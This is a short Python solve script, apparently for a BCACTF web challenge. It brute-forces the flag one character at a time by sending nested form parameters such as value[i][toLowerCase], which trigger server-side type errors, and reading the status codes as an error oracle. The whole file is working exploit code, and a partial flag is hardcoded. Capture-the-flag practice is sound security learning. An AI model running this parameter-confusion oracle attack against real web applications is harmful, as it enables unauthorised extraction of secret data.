import requests
import time
import string
from tqdm import tqdm
import json

url = 'http://challs.bcactf.com:35101/'
# url = 'http://localhost:3000/'

def req(data):
    response = requests.post(url, data=data)
    return response

# def get_avg_time(data, n=10):
#     total_time = 0
#     last_rsp = None
#     for _ in range(n):
#         last_rsp, t = req(data)
#         total_time += t
#     return last_rsp, total_time / n

FLAG_LEN = 33
alphabet = '{}_' + string.ascii_lowercase + string.digits + string.ascii_uppercase
FLAG = 'bcactf{0ut_0f_1d34s_4e'

body = {}
for i in range(len(FLAG)):
    body[f'value[{i}]'] = FLAG[i]

for i in range(len(FLAG), FLAG_LEN):
    body[f'value[{i}]'] = '?'

for i in range(len(FLAG), FLAG_LEN):
    if f'value[{i}][toLowerCase]' in body:
        del body[f'value[{i}][toLowerCase]']

    if f'value[{i+1}]' in body:
        del body[f'value[{i+1}]']

    body[f'value[{i+1}][toLowerCase]'] = 1
    for c in tqdm(alphabet):
        body[f'value[{i}]'] = c
        r = req(body)
        # print(c, r.text, r.status_code)
        if r.status_code != 200:
            # error happened, leaked char
            FLAG += c
            print(FLAG)
            body[f'value[{i}]'] = c
            break